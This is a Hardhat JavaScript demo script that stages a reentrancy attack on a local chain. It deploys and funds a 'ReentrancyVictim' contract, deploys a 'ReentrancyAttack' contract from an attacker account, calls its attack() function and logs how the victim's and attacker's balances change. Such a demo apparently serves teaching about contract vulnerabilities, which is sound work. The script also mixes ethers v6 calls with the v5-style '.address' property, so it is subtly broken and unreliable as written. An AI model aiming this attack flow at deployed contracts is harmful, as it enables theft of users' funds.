// scripts/run-demo.js
const { ethers } = require("hardhat");

async function main() {
  const [deployer, attackerEOA] = await ethers.getSigners();

  console.log("Deployer EOA:", deployer.address);
  console.log("Attacker EOA:", attackerEOA.address);

  // Deploy victim (ReentrancyVictim.sol)
  const Victim = await ethers.getContractFactory("ReentrancyVictim");
  const victim = await Victim.deploy();
  await victim.waitForDeployment(); // ethers v6

  console.log("ReentrancyVictim deployed to:", victim.address);

  // deposit 10 ETH as "other users" (from deployer)
  await deployer.sendTransaction({ to: victim.address, value: ethers.parseEther("10") });
  console.log("Deployer deposited 10 ETH to victim");

  // Deploy attacker contract from attackerEOA
  const Attacker = await ethers.getContractFactory("ReentrancyAttack");
  const attackerContract = await Attacker.connect(attackerEOA).deploy(victim.address);
  await attackerContract.waitForDeployment();

  console.log("Attacker contract deployed to:", attackerContract.address);

  // balances before
  const beforeVictim = await ethers.provider.getBalance(victim.address);
  console.log("Victim balance BEFORE attack:", ethers.formatEther(beforeVictim));

  // attacker performs attack sending 1 ETH
  const tx = await attackerContract.connect(attackerEOA).attack({ value: ethers.parseEther("1") });
  await tx.wait();
  console.log("Attack tx mined.");

  // balances after
  const afterVictim = await ethers.provider.getBalance(victim.address);
  const attackerContractBal = await ethers.provider.getBalance(attackerContract.address);
  const attackerEOABal = await ethers.provider.getBalance(attackerEOA.address);

  console.log("Victim balance AFTER attack:", ethers.formatEther(afterVictim));
  console.log("Attacker contract balance AFTER attack:", ethers.formatEther(attackerContractBal));
  console.log("Attacker EOA balance AFTER attack:", ethers.formatEther(attackerEOABal));
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
